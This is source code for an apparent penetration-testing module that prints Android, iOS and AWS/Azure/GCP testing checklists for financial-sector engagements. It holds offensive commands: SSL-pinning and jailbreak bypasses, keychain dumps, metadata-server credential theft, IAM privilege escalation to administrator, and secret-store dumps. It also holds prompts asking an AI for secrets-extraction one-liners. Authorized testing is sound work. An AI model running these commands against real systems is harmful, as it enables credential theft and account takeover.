#!/usr/bin/env python3
"""
HAKUZA mod_mobile_cloud.py — Mobile App & Cloud Security Testing Module
Divith D Shetty | CAISP · CRTP | BFSI Specialist

Adds: cmd_mobile, cmd_ios, cmd_cloud, cmd_iot
Append argparse sub-commands and dispatch entries from bottom of this file.
"""

# ---------------------------------------------------------------------------
# IMPORTS — uses interfaces already present in hakuza.py
# ---------------------------------------------------------------------------

import os
import sys
import re
import json
import subprocess
import shutil
from datetime import datetime
from pathlib import Path

# Rich (all imported in hakuza.py globals; imported again so module is self-contained)
from rich.console import Console
from rich.panel import Panel
from rich.rule import Rule
from rich.table import Table
from rich.markdown import Markdown
from rich.prompt import Prompt, Confirm
from rich import box


# ---------------------------------------------------------------------------
# INTERNAL HELPERS
# ---------------------------------------------------------------------------

def _require_engagement(console: Console) -> dict:
    """Return current engagement dict or print error and exit."""
    # Import from parent module at call time to avoid circular issues
    from hakuza import get_current_engagement
    eng = get_current_engagement()
    if not eng:
        console.print(
            Panel(
                "[red]No active engagement.[/red]\n\n"
                "Create one first:\n"
                "  [bold]hakuza init <name> --client <client> --target <target> --type mobile[/bold]",
                title="Error",
                border_style="red",
                expand=False,
            )
        )
        sys.exit(1)
    return eng


def _check_tool(name: str) -> bool:
    return shutil.which(name) is not None


def _tool_badge(name: str) -> str:
    return "[bold green]OK[/bold green]" if _check_tool(name) else "[bold red]MISSING[/bold red]"


def _section(console: Console, title: str) -> None:
    console.print()
    console.print(Rule(f"[bold cyan]{title}[/bold cyan]", style="dim cyan"))


def _offer_finding(console: Console, eng: dict, title: str, severity: str,
                   description: str, remediation: str, tool: str = "hakuza-mobile") -> None:
    """Prompt the tester to add a finding to the engagement DB."""
    from hakuza import add_finding
    if Confirm.ask(f"\n[yellow]Add '[bold]{title}[/bold]' as a {severity.upper()} finding?[/yellow]", default=False):
        url = Prompt.ask("  URL / identifier", default=eng.get("target", ""))
        evidence = Prompt.ask("  Evidence (paste key line or leave blank)", default="")
        f = add_finding(
            engagement_id=eng["id"],
            title=title,
            severity=severity,
            description=description,
            evidence=evidence or None,
            remediation=remediation,
            tool=tool,
            url=url or None,
        )
        console.print(f"  [green]Finding added:[/green] {f['short_id']} — {f['title']}")


# ---------------------------------------------------------------------------
# cmd_mobile
# ---------------------------------------------------------------------------

def cmd_mobile(args, console: Console) -> None:
    """
    hakuza mobile [--apk <path>] [--package <com.example.app>] [--phase static|dynamic|full]

    Android security testing: static analysis, dynamic analysis, OWASP Mobile Top 10.
    """
    from hakuza import (
        get_client_or_none, get_client, stream_to_console,
        SYSTEM_PROMPT, HAKUZA_DIR, run_tool, ENGAGEMENTS_DIR,
    )

    eng = _require_engagement(console)
    apk_path = getattr(args, "apk", None)
    package = getattr(args, "package", None)
    phase = getattr(args, "phase", "full") or "full"

    console.print(
        Panel(
            f"[bold]Engagement:[/bold]  {eng['name']}  ({eng['client']})\n"
            f"[bold]Target:[/bold]      {eng['target']}\n"
            f"[bold]APK:[/bold]         {apk_path or '[dim]not provided[/dim]'}\n"
            f"[bold]Package:[/bold]     {package or '[dim]not provided[/dim]'}\n"
            f"[bold]Phase:[/bold]       {phase}",
            title="[bold cyan]  HAKUZA Android Security Testing[/bold cyan]",
            border_style="cyan",
            expand=False,
        )
    )

    # ---- Tool availability ------------------------------------------------
    _section(console, "Tool Check")
    tools_needed = [
        ("jadx",    "APK decompiler"),
        ("apktool", "APK disassembler / resource decoder"),
        ("adb",     "Android Debug Bridge"),
        ("frida",   "Dynamic instrumentation"),
        ("frida-ps","Frida process list"),
        ("mobsf",   "MobSF (run separately)"),
        ("objection","Runtime mobile exploration"),
    ]
    tbl = Table(box=box.SIMPLE, show_header=True, header_style="bold")
    tbl.add_column("Tool", style="cyan", width=14)
    tbl.add_column("Status", width=14)
    tbl.add_column("Purpose", style="dim")
    for t, purpose in tools_needed:
        tbl.add_row(t, _tool_badge(t), purpose)
    console.print(tbl)

    # ---- Static analysis --------------------------------------------------
    if phase in ("static", "full"):
        _section(console, "Static Analysis")

        if apk_path:
            apk = Path(apk_path)
            if not apk.exists():
                console.print(f"[red]APK not found:[/red] {apk_path}")
            else:
                out_dir = ENGAGEMENTS_DIR / eng["name"] / "artifacts" / apk.stem
                if _check_tool("jadx"):
                    console.print(f"[cyan]Running jadx decompile → {out_dir}[/cyan]")
                    stdout, stderr, rc = run_tool(
                        ["jadx", "-d", str(out_dir), str(apk)], timeout=180
                    )
                    if rc == 0:
                        console.print(f"  [green]jadx complete — output:[/green] {out_dir}")
                        # List top-level dirs
                        if out_dir.exists():
                            for item in sorted(out_dir.iterdir())[:12]:
                                console.print(f"    {item.name}/")
                    else:
                        console.print(f"  [yellow]jadx error:[/yellow] {stderr[:200]}")
                elif _check_tool("apktool"):
                    console.print("[cyan]Running apktool decode...[/cyan]")
                    stdout, stderr, rc = run_tool(
                        ["apktool", "d", str(apk), "-o", str(out_dir), "-f"], timeout=120
                    )
                    console.print("[green]apktool done[/green]" if rc == 0 else f"[yellow]{stderr[:200]}[/yellow]")
                else:
                    console.print("[yellow]jadx and apktool not installed — skipping decompile.[/yellow]")

        # Manifest analysis grep commands
        _section(console, "Manifest Analysis — Grep Commands")
        manifest_checks = [
            ("Backup enabled",            r'grep -r "allowBackup=\"true\""'),
            ("Debuggable flag",           r'grep -r "debuggable=\"true\""'),
            ("Exported activities",       r'grep -r "exported=\"true\""'),
            ("No permission on exported", r'grep -rA3 "exported=\"true\"" | grep -v "permission"'),
            ("Deep link handlers",        r'grep -r "android.intent.action.VIEW"'),
            ("Custom permissions",        r'grep -r "<permission"'),
            ("Broadcast receivers",       r'grep -r "<receiver"'),
            ("Cleartext traffic",         r'grep -r "usesCleartextTraffic=\"true\""'),
            ("Network security config",   r'grep -r "networkSecurityConfig"'),
        ]
        tbl2 = Table(box=box.SIMPLE, show_header=True, header_style="bold")
        tbl2.add_column("Check", style="cyan", width=28)
        tbl2.add_column("Command", style="white")
        for check, cmd in manifest_checks:
            tbl2.add_row(check, cmd + " AndroidManifest.xml")
        console.print(tbl2)

        # Code analysis grep commands
        _section(console, "Code Analysis — Grep Commands")
        code_checks = [
            ("Hardcoded API keys",        r'grep -rE "(api_key|apikey|API_KEY|secret|password)\s*=\s*[\"'+"'"+"'][^\"']{6,}"  ),
            ("Hardcoded URLs",            r'grep -rE "https?://[a-zA-Z0-9._/-]{10,}" --include="*.java" --include="*.kt"'),
            ("SharedPreferences (write)", r'grep -rn "putString\|putInt\|putFloat\|commit\|apply"'),
            ("SQLite unencrypted",        r'grep -rn "openDatabase\|SQLiteOpenHelper\|execSQL"'),
            ("External storage write",    r'grep -rn "getExternalStorage\|EXTERNAL_STORAGE"'),
            ("Insecure logging",          r'grep -rn "Log\.d\|Log\.v\|Log\.i\|Log\.w\|Log\.e"'),
            ("Weak crypto — DES/MD5/ECB", r'grep -rn "DES\|MD5\|ECB\|\"RC4\"\|\"DESede\""'),
            ("WebView JS enabled",        r'grep -rn "setJavaScriptEnabled(true)"'),
            ("WebView addJSInterface",    r'grep -rn "addJavascriptInterface"'),
            ("SSL bypass patterns",       r'grep -rn "TrustAllCerts\|X509TrustManager\|checkServerTrusted"'),
            ("Root detection",            r'grep -rn "su\|Superuser\|RootBeer\|isRooted"'),
            ("HTTP cleartext",            r'grep -rn "http://" --include="*.java" --include="*.kt"'),
            ("Insecure random",           r'grep -rn "new Random\|Math.random()"'),
            ("Pending intent mutable",    r'grep -rn "FLAG_MUTABLE\|FLAG_UPDATE_CURRENT"'),
        ]
        tbl3 = Table(box=box.SIMPLE, show_header=True, header_style="bold")
        tbl3.add_column("Check", style="cyan", width=28)
        tbl3.add_column("Grep Command", style="white")
        for check, cmd in code_checks:
            tbl3.add_row(check, cmd)
        console.print(tbl3)
        console.print("[dim]Run these inside the jadx/apktool output directory.[/dim]")

    # ---- Dynamic analysis -------------------------------------------------
    if phase in ("dynamic", "full"):
        _section(console, "Dynamic Analysis")
        pkg = package or "<com.target.app>"

        console.print(Panel(
            f"[bold cyan]Frida — SSL Pinning Bypass[/bold cyan]\n"
            f"  frida -U -l ~/tools/frida-scripts/ssl-pinning-bypass.js -f {pkg}\n\n"
            f"[bold cyan]Frida — Root Detection Bypass[/bold cyan]\n"
            f"  frida -U -l ~/tools/frida-scripts/root-detection-bypass.js -f {pkg}\n\n"
            f"[bold cyan]Frida — Crypto Logger[/bold cyan]\n"
            f"  frida -U -l ~/tools/frida-scripts/crypto-logger.js -f {pkg}\n\n"
            f"[bold cyan]Frida — HTTP Traffic Logger[/bold cyan]\n"
            f"  frida -U -l ~/tools/frida-scripts/http-logger.js -f {pkg}\n\n"
            f"[bold cyan]Frida — SharedPrefs Dump[/bold cyan]\n"
            f"  frida -U -l ~/tools/frida-scripts/sharedprefs-dump.js -f {pkg}\n\n"
            f"[bold cyan]Frida — Intent Monitor[/bold cyan]\n"
            f"  frida -U -l ~/tools/frida-scripts/intent-monitor.js -f {pkg}\n\n"
            f"[bold cyan]List running processes[/bold cyan]\n"
            f"  frida-ps -U",
            title="Frida Commands",
            border_style="magenta",
            expand=False,
        ))

        console.print(Panel(
            f"[bold cyan]Install Burp CA cert via ADB[/bold cyan]\n"
            f"  adb shell settings put global http_proxy 127.0.0.1:8080\n"
            f"  adb push burp_ca.der /sdcard/burp_ca.der\n"
            f"  adb shell am start -n com.android.certinstaller/.CertInstallerMain \\\n"
            f"         -a android.intent.action.VIEW -t application/x-x509-ca-cert \\\n"
            f"         -d file:///sdcard/burp_ca.der\n\n"
            f"[bold cyan]Proxy toggle[/bold cyan]\n"
            f"  adb shell settings put global http_proxy 192.168.1.X:8080  # on\n"
            f"  adb shell settings delete global http_proxy                 # off\n\n"
            f"[bold cyan]Deep link testing[/bold cyan]\n"
            f"  adb shell am start -a android.intent.action.VIEW -d 'app://target/path?param=value'\n\n"
            f"[bold cyan]Intent fuzzing[/bold cyan]\n"
            f"  adb shell am start -n {pkg}/.MainActivity --es param 'FUZZ'\n"
            f"  adb shell am broadcast -a com.target.ACTION --es data 'PAYLOAD'\n\n"
            f"[bold cyan]File system inspection[/bold cyan]\n"
            f"  adb shell run-as {pkg} ls -la /data/data/{pkg}/\n"
            f"  adb shell run-as {pkg} cat /data/data/{pkg}/shared_prefs/*.xml\n"
            f"  adb shell run-as {pkg} ls -la /data/data/{pkg}/databases/",
            title="ADB / Traffic Interception",
            border_style="blue",
            expand=False,
        ))

    # ---- OWASP Mobile Top 10 ---------------------------------------------
    _section(console, "OWASP Mobile Top 10 — BFSI Checklist")
    m10 = [
        ("M1", "Improper Credential Usage",
         "grep hardcoded creds; test token storage in SharedPrefs/DB",
         "Check /data/data/<pkg>/shared_prefs/ for tokens; run crypto-logger.js"),
        ("M2", "Inadequate Supply Chain Security",
         "check 3rd-party SDKs for known CVEs; review build.gradle dependencies",
         "grep 'compile|implementation' build.gradle; check deps.dev or OWASP Dependency-Check"),
        ("M3", "Insecure Authentication/Authorization",
         "bypass login via token replay, certificate reuse, OTP brute",
         "python3 ~/tools/otp-brute.py; replay auth tokens; test JWT none-alg"),
        ("M4", "Insufficient Input/Output Validation",
         "SQLi, XSS in WebViews, intent injection via exported activities",
         "grep addJavascriptInterface; fuzz deep link params; send malformed intents via adb"),
        ("M5", "Insecure Communication",
         "cleartext HTTP, custom TLS validation bypass, weak cipher suites",
         "grep 'http://'; check network_security_config.xml; run ssl-pinning-bypass.js"),
        ("M6", "Inadequate Privacy Controls",
         "PII logged, written to external storage, sent to analytics SDKs",
         "grep Log.d/Log.v; check /sdcard; inspect analytics SDK payloads in Burp"),
        ("M7", "Insufficient Binary Protections",
         "missing obfuscation, root/emulator detection bypassable",
         "jadx decompile — readable class names? Run root-detection-bypass.js; check for anti-debug"),
        ("M8", "Security Misconfiguration",
         "debuggable=true, backup=true, exported components without permissions",
         "grep debuggable; grep allowBackup; grep exported in AndroidManifest.xml"),
        ("M9", "Insecure Data Storage",
         "SQLite plaintext, SharedPrefs with sensitive data, external storage",
         "adb shell run-as <pkg>; sqlite3 /data/data/<pkg>/databases/*.db; pull /sdcard/"),
        ("M10","Insufficient Cryptography",
         "DES, MD5, ECB mode, hardcoded IV, weak key size",
         "grep -rn 'DES\\|MD5\\|ECB\\|AES/ECB'; frida crypto-logger.js for runtime key capture"),
    ]
    tbl4 = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan", expand=True)
    tbl4.add_column("ID", style="bold", width=4)
    tbl4.add_column("Category", width=28)
    tbl4.add_column("What to Check", ratio=2)
    tbl4.add_column("How (Command)", ratio=3)
    for m_id, cat, what, how in m10:
        tbl4.add_row(m_id, cat, what, how)
    console.print(tbl4)

    # ---- AI analysis ------------------------------------------------------
    _section(console, "AI-Powered Analysis")
    client_ai = get_client_or_none()
    if client_ai is None:
        console.print("[dim]Set ANTHROPIC_API_KEY for AI analysis.[/dim]")
    else:
        context_parts = [
            f"Engagement: {eng['name']} | Client: {eng['client']} | Target: {eng['target']}",
            f"Phase: {phase}",
        ]
        if apk_path:
            context_parts.append(f"APK: {apk_path}")
        if package:
            context_parts.append(f"Package: {package}")
        prompt = (
            "You are reviewing an Android application for a BFSI client. "
            + " ".join(context_parts) + "\n\n"
            "Provide:\n"
            "1. Top 5 highest-priority test cases specific to BFSI Android apps "
            "(banking/payments/insurance — common real-world P1/P2 findings)\n"
            "2. Three Frida one-liners for runtime secrets extraction\n"
            "3. PCI-DSS relevant controls that mobile apps must satisfy (DSS v4.0)\n"
            "4. RBI Cyber Security Framework mobile-specific requirements\n"
            "Keep it actionable and copy-paste ready."
        )
        stream_to_console(client_ai, [{"role": "user", "content": prompt}], max_tokens=900, console=console)

    # ---- Offer finding ----------------------------------------------------
    console.print()
    _offer_finding(
        console, eng,
        title="Android App — Security Review Initiated",
        severity="informational",
        description=f"Android mobile security testing initiated for package {package or eng['target']}. "
                    "Static and dynamic analysis checklist reviewed. Follow-up findings to be logged separately.",
        remediation="Follow OWASP MASVS L2 controls. Enforce certificate pinning, disable backup/debug flags.",
        tool="hakuza-mobile",
    )


# ---------------------------------------------------------------------------
# cmd_ios
# ---------------------------------------------------------------------------

def cmd_ios(args, console: Console) -> None:
    """
    hakuza ios [--ipa <path>] [--bundle <com.example.app>]

    iOS security testing: static analysis, dynamic analysis, OWASP Mobile Top 10.
    """
    from hakuza import get_client_or_none, stream_to_console, run_tool, ENGAGEMENTS_DIR

    eng = _require_engagement(console)
    ipa_path = getattr(args, "ipa", None)
    bundle_id = getattr(args, "bundle", None)

    console.print(
        Panel(
            f"[bold]Engagement:[/bold]  {eng['name']}  ({eng['client']})\n"
            f"[bold]Target:[/bold]      {eng['target']}\n"
            f"[bold]IPA:[/bold]         {ipa_path or '[dim]not provided[/dim]'}\n"
            f"[bold]Bundle ID:[/bold]   {bundle_id or '[dim]not provided[/dim]'}",
            title="[bold cyan]  HAKUZA iOS Security Testing[/bold cyan]",
            border_style="cyan",
            expand=False,
        )
    )

    # Tool check
    _section(console, "Tool Check")
    ios_tools = [
        ("objection",     "iOS/Android runtime exploration via Frida"),
        ("frida",         "Dynamic instrumentation toolkit"),
        ("frida-ps",      "List processes on device"),
        ("class-dump",    "Objective-C class/method extraction"),
        ("strings",       "Strings extraction from binary"),
        ("nm",            "Symbol table reader"),
        ("otool",         "Mach-O binary analysis"),
    ]
    tbl = Table(box=box.SIMPLE, show_header=True, header_style="bold")
    tbl.add_column("Tool", style="cyan", width=14)
    tbl.add_column("Status", width=14)
    tbl.add_column("Purpose", style="dim")
    for t, purpose in ios_tools:
        tbl.add_row(t, _tool_badge(t), purpose)
    console.print(tbl)

    # Static analysis
    _section(console, "Static Analysis")
    bid = bundle_id or "<com.target.app>"
    console.print(Panel(
        "[bold cyan]Info.plist — Key items to check[/bold cyan]\n"
        "  strings <binary> | grep -E 'NSAppTransportSecurity|NSAllowsArbitraryLoads'\n"
        "  plutil -p Info.plist | grep -E 'NSPermission|LSApplicationQueriesSchemes'\n"
        "  grep -i 'NSFaceIDUsageDescription\\|NSCameraUsageDescription' Info.plist\n\n"
        "[bold cyan]ATS (App Transport Security)[/bold cyan]\n"
        "  grep -r 'NSAllowsArbitraryLoads' *.plist   # should be false\n"
        "  grep -r 'NSExceptionDomains' *.plist        # per-domain exceptions\n\n"
        "[bold cyan]URL Schemes (deep links)[/bold cyan]\n"
        "  grep -r 'CFBundleURLSchemes' Info.plist\n"
        "  # Test: xcrun simctl openurl booted 'scheme://path?param=PAYLOAD'\n\n"
        "[bold cyan]Binary strings — secrets hunt[/bold cyan]\n"
        "  strings Payload/*.app/<binary> | grep -iE 'key|secret|token|password|api'\n"
        "  strings Payload/*.app/<binary> | grep -E 'https?://'\n\n"
        "[bold cyan]class-dump — class/method enumeration[/bold cyan]\n"
        "  class-dump -H Payload/*.app/<binary> -o ./headers/\n"
        "  grep -r 'password\\|secret\\|token\\|apikey\\|encrypt' ./headers/\n\n"
        "[bold cyan]Entitlements check[/bold cyan]\n"
        "  codesign -d --entitlements :- Payload/*.app/<binary>",
        title="Static Analysis Commands",
        border_style="blue",
        expand=False,
    ))

    # Dynamic analysis
    _section(console, "Dynamic Analysis")
    console.print(Panel(
        f"[bold cyan]Objection — Runtime Exploration[/bold cyan]\n"
        f"  objection -g {bid} explore\n"
        f"  # Inside objection:\n"
        f"  ios sslpinning disable\n"
        f"  ios jailbreak disable\n"
        f"  ios keychain dump\n"
        f"  ios nsurlcredentialstorage dump\n"
        f"  ios userdefaults get\n"
        f"  ios cookies get\n"
        f"  memory search --string 'password'\n\n"
        f"[bold cyan]Frida — SSL Pinning Bypass[/bold cyan]\n"
        f"  frida -U -l ~/tools/frida-scripts/ios-ssl-bypass.js -f {bid}\n\n"
        f"[bold cyan]Frida — Crypto Logger[/bold cyan]\n"
        f"  frida -U -l ~/tools/frida-scripts/crypto-logger.js -f {bid}\n\n"
        f"[bold cyan]Frida — List processes[/bold cyan]\n"
        f"  frida-ps -U\n\n"
        f"[bold cyan]Keychain dump (on jailbroken device)[/bold cyan]\n"
        f"  frida -U -l ~/tools/frida-scripts/ios-ssl-bypass.js {bid}\n"
        f"  # Or via objection: ios keychain dump\n\n"
        f"[bold cyan]Burp proxy setup on iOS[/bold cyan]\n"
        f"  # 1. Set Wi-Fi proxy to Burp listener IP:8080\n"
        f"  # 2. Browse to http://burp → download CA cert\n"
        f"  # 3. Settings → General → VPN & Device Management → install cert\n"
        f"  # 4. Settings → General → About → Certificate Trust Settings → trust it",
        title="Dynamic Analysis Commands",
        border_style="magenta",
        expand=False,
    ))

    # OWASP Mobile Top 10 — iOS context
    _section(console, "OWASP Mobile Top 10 — iOS / BFSI")
    m10_ios = [
        ("M1","Credential Usage","Hardcoded tokens, insecure keychain storage",
         "strings + grep; objection ios keychain dump"),
        ("M2","Supply Chain","3rd-party SDK versions, CocoaPods vulns",
         "cat Podfile.lock; check deps for known CVEs"),
        ("M3","Authentication","Biometric bypass, token reuse, jailbreak auth skip",
         "frida hook LocalAuthentication; replay auth tokens in Burp"),
        ("M4","Input Validation","XSS in WKWebView, URL scheme injection",
         "grep addScriptMessageHandler; fuzz deep link params"),
        ("M5","Communication","ATS disabled, weak TLS, pinning bypassable",
         "grep NSAllowsArbitraryLoads; run ios-ssl-bypass.js"),
        ("M6","Privacy","PII in UserDefaults, pasteboard, analytics leaks",
         "objection ios userdefaults get; grep NSUserDefaults in headers/"),
        ("M7","Binary Protection","No PIE, missing stack canaries, no bitcode",
         "otool -hv <bin> | grep PIE; checksec (if available)"),
        ("M8","Misconfiguration","Debug entitlements, get-task-allow, excess permissions",
         "codesign -d --entitlements; grep get-task-allow"),
        ("M9","Data Storage","NSDocumentDirectory unencrypted, Core Data plaintext",
         "objection ios filesystem ls; ideviceinstaller list apps"),
        ("M10","Cryptography","CommonCrypto ECB mode, hardcoded IV/key",
         "frida hook CCCrypt; crypto-logger.js; strings grep for Base64 keys"),
    ]
    tbl5 = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan", expand=True)
    tbl5.add_column("ID", width=4)
    tbl5.add_column("Category", width=22)
    tbl5.add_column("What to Check", ratio=2)
    tbl5.add_column("How", ratio=3)
    for row in m10_ios:
        tbl5.add_row(*row)
    console.print(tbl5)

    # AI analysis
    _section(console, "AI-Powered iOS Analysis")
    client_ai = get_client_or_none()
    if client_ai is None:
        console.print("[dim]Set ANTHROPIC_API_KEY for AI analysis.[/dim]")
    else:
        prompt = (
            f"You are reviewing an iOS application for a BFSI client.\n"
            f"Engagement: {eng['name']} | Client: {eng['client']} | Target: {eng['target']}\n"
            f"Bundle: {bundle_id or 'unknown'}\n\n"
            "Provide:\n"
            "1. Top 5 iOS-specific attack vectors for BFSI apps (banking/insurance)\n"
            "2. Three Frida one-liners for iOS runtime analysis\n"
            "3. Common iOS certificate pinning implementations and bypass strategies\n"
            "4. PCI-DSS v4.0 and RBI CSF controls relevant to iOS mobile apps\n"
            "Keep commands copy-paste ready."
        )
        stream_to_console(client_ai, [{"role": "user", "content": prompt}], max_tokens=800, console=console)

    _offer_finding(
        console, eng,
        title="iOS App — Security Review Initiated",
        severity="informational",
        description=f"iOS mobile security testing initiated for bundle {bundle_id or eng['target']}. "
                    "Static and dynamic analysis checklists reviewed.",
        remediation="Follow OWASP MASVS L2 for iOS. Enable ATS, enforce certificate pinning, "
                    "use Keychain with kSecAttrAccessibleWhenUnlockedThisDeviceOnly.",
        tool="hakuza-ios",
    )


# ---------------------------------------------------------------------------
# cmd_cloud
# ---------------------------------------------------------------------------

def cmd_cloud(args, console: Console) -> None:
    """
    hakuza cloud [--provider aws|azure|gcp|all] [--target <url_or_account>] [--profile <aws_profile>]

    Cloud security testing: AWS, Azure, GCP attack paths + BFSI compliance.
    """
    from hakuza import get_client_or_none, stream_to_console, run_tool

    eng = _require_engagement(console)
    provider = getattr(args, "provider", "all") or "all"
    target = getattr(args, "target", None) or eng.get("target", "")
    profile = getattr(args, "profile", "default") or "default"

    console.print(
        Panel(
            f"[bold]Engagement:[/bold]  {eng['name']}  ({eng['client']})\n"
            f"[bold]Provider:[/bold]    {provider}\n"
            f"[bold]Target:[/bold]      {target}\n"
            f"[bold]AWS Profile:[/bold] {profile}",
            title="[bold cyan]  HAKUZA Cloud Security Testing[/bold cyan]",
            border_style="cyan",
            expand=False,
        )
    )

    # ---- AWS ---------------------------------------------------------------
    if provider in ("aws", "all"):
        _section(console, "AWS — Recon & Attack Paths")
        console.print(Panel(
            "[bold cyan]SSRF → IMDSv1 (legacy)[/bold cyan]\n"
            "  curl http://169.254.169.254/latest/meta-data/\n"
            "  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
            "  curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>\n\n"
            "[bold cyan]IMDSv2 (token required)[/bold cyan]\n"
            "  TOKEN=$(curl -s -X PUT 'http://169.254.169.254/latest/api/token' \\\n"
            "    -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')\n"
            "  curl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n"
            "    http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n"
            "[bold cyan]S3 bucket enumeration[/bold cyan]\n"
            "  aws s3 ls s3://target-bucket --no-sign-request\n"
            "  aws s3 ls s3://target-bucket --no-sign-request --recursive 2>&1 | head -30\n"
            "  aws s3 cp s3://target-bucket/test.txt /tmp/ --no-sign-request  # read test\n"
            "  python3 ~/tools/s3-scanner.py <domain>\n\n"
            "[bold cyan]CloudFront / CDN[/bold cyan]\n"
            "  dig <domain>   # look for .cloudfront.net CNAME\n"
            "  curl -H 'Host: <target>' https://<cloudfront-id>.cloudfront.net/\n\n"
            "[bold cyan]Initial IAM recon (with creds)[/bold cyan]\n"
            f"  aws --profile {profile} sts get-caller-identity\n"
            f"  aws --profile {profile} iam get-user\n"
            f"  aws --profile {profile} iam list-attached-user-policies --user-name <you>\n"
            f"  aws --profile {profile} iam list-user-policies --user-name <you>",
            title="AWS Recon",
            border_style="yellow",
            expand=False,
        ))

        console.print(Panel(
            "[bold cyan]IAM Privilege Escalation Paths[/bold cyan]\n\n"
            "1. iam:CreatePolicyVersion → create new policy version with admin\n"
            "   aws iam create-policy-version --policy-arn <arn> --policy-document file://admin.json --set-as-default\n\n"
            "2. iam:AttachUserPolicy → attach AdministratorAccess to self\n"
            "   aws iam attach-user-policy --user-name <you> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n\n"
            "3. iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction → Lambda exec as admin role\n"
            "   aws lambda create-function --function-name pwn --runtime python3.9 \\\n"
            "     --role <admin-role-arn> --handler index.handler --zip-file fileb://pwn.zip\n\n"
            "4. iam:PassRole + ec2:RunInstances → launch EC2 with admin instance profile\n\n"
            "5. sts:AssumeRole → assume a cross-account or admin role\n"
            f"   aws --profile {profile} sts assume-role --role-arn <arn> --role-session-name pwn\n\n"
            "6. iam:CreateAccessKey on another user → generate creds for admin user\n"
            "7. iam:UpdateLoginProfile → reset admin user's console password\n"
            "8. iam:CreateLoginProfile on user without one → create console access\n"
            "9. secretsmanager:GetSecretValue → dump all secrets\n"
            "   aws secretsmanager list-secrets\n"
            "   aws secretsmanager get-secret-value --secret-id <id>\n\n"
            "10. ssm:GetParameters → dump SSM Parameter Store (often has DB passwords)\n"
            "    aws ssm describe-parameters\n"
            "    aws ssm get-parameters-by-path --path / --recursive --with-decryption",
            title="AWS IAM Escalation",
            border_style="red",
            expand=False,
        ))

        console.print(Panel(
            "[bold cyan]Common AWS Misconfigs — BFSI[/bold cyan]\n\n"
            f"Public S3 buckets:\n"
            f"  aws s3api get-bucket-acl --bucket <name> --profile {profile}\n"
            f"  aws s3api get-bucket-policy --bucket <name> --profile {profile}\n\n"
            f"Overly permissive security groups (0.0.0.0/0):\n"
            f"  aws ec2 describe-security-groups --profile {profile} \\\n"
            f"    --query 'SecurityGroups[?IpPermissions[?IpRanges[?CidrIp==`0.0.0.0/0`]]]'\n\n"
            f"Unencrypted EBS volumes:\n"
            f"  aws ec2 describe-volumes --profile {profile} \\\n"
            f"    --query 'Volumes[?!Encrypted].[VolumeId,State]'\n\n"
            f"Public RDS snapshots:\n"
            f"  aws rds describe-db-snapshots --snapshot-type public --profile {profile}\n\n"
            f"CloudTrail disabled:\n"
            f"  aws cloudtrail describe-trails --profile {profile}\n"
            f"  aws cloudtrail get-trail-status --name <trail> --profile {profile}\n\n"
            f"MFA not enforced on root:\n"
            f"  aws iam get-account-summary --profile {profile} | grep MFAEnabled\n\n"
            f"Publicly exposed ElasticSearch:\n"
            f"  aws es list-domain-names --profile {profile}\n"
            f"  aws es describe-elasticsearch-domain --domain-name <d> --profile {profile}\n\n"
            f"Lambda with sensitive env vars:\n"
            f"  aws lambda list-functions --profile {profile}\n"
            f"  aws lambda get-function-configuration --function-name <fn> --profile {profile}",
            title="AWS Misconfiguration Checks",
            border_style="orange3",
            expand=False,
        ))

    # ---- Azure -------------------------------------------------------------
    if provider in ("azure", "all"):
        _section(console, "Azure — Recon & Attack Paths")
        console.print(Panel(
            "[bold cyan]Initial Recon[/bold cyan]\n"
            "  az login  # or use service principal\n"
            "  az account show\n"
            "  az account list\n"
            "  az ad signed-in-user show\n"
            "  az role assignment list --assignee <upn>\n\n"
            "[bold cyan]Azure AD Enumeration[/bold cyan]\n"
            "  az ad user list --query '[].{UPN:userPrincipalName,DisplayName:displayName}'\n"
            "  az ad group list\n"
            "  az ad sp list --all --query '[].{App:appDisplayName,ID:appId}'\n\n"
            "[bold cyan]Managed Identity Abuse[/bold cyan]\n"
            "  # From within Azure VM with managed identity:\n"
            "  curl -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token"
            "?api-version=2018-02-01&resource=https://management.azure.com/'\n\n"
            "[bold cyan]Storage Account Enum[/bold cyan]\n"
            "  az storage account list\n"
            "  az storage blob list --account-name <name> --container-name <c> --auth-mode login\n"
            "  # Anonymous access check:\n"
            "  curl https://<account>.blob.core.windows.net/<container>?restype=container&comp=list\n\n"
            "[bold cyan]Key Vault Secrets[/bold cyan]\n"
            "  az keyvault list\n"
            "  az keyvault secret list --vault-name <vault>\n"
            "  az keyvault secret show --vault-name <vault> --name <secret-name>",
            title="Azure Attack Paths",
            border_style="blue",
            expand=False,
        ))

    # ---- GCP ---------------------------------------------------------------
    if provider in ("gcp", "all"):
        _section(console, "GCP — Recon & Attack Paths")
        console.print(Panel(
            "[bold cyan]GCP Metadata Server (SSRF)[/bold cyan]\n"
            "  curl -H 'Metadata-Flavor: Google' \\\n"
            "    http://metadata.google.internal/computeMetadata/v1/\n"
            "  curl -H 'Metadata-Flavor: Google' \\\n"
            "    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n\n"
            "[bold cyan]Initial Recon[/bold cyan]\n"
            "  gcloud auth list\n"
            "  gcloud config list\n"
            "  gcloud projects list\n"
            "  gcloud iam service-accounts list\n"
            "  gcloud iam roles list --project <project>\n\n"
            "[bold cyan]GCS Bucket Permissions[/bold cyan]\n"
            "  gsutil iam get gs://<bucket>   # check allUsers/allAuthenticatedUsers\n"
            "  gsutil ls -r gs://<bucket>     # list contents\n"
            "  # Anonymous check:\n"
            "  curl https://storage.googleapis.com/<bucket>/\n\n"
            "[bold cyan]Service Account Key Abuse[/bold cyan]\n"
            "  gcloud iam service-accounts keys list --iam-account <sa>@<project>.iam.gserviceaccount.com\n"
            "  # If key file found: export GOOGLE_APPLICATION_CREDENTIALS=key.json\n\n"
            "[bold cyan]Workload Identity Federation[/bold cyan]\n"
            "  # Check for misconfigured attribute conditions that allow external principals\n"
            "  gcloud iam workload-identity-pools list --location global",
            title="GCP Attack Paths",
            border_style="green",
            expand=False,
        ))

    # ---- BFSI Compliance --------------------------------------------------
    _section(console, "BFSI Cloud Compliance Checklist")
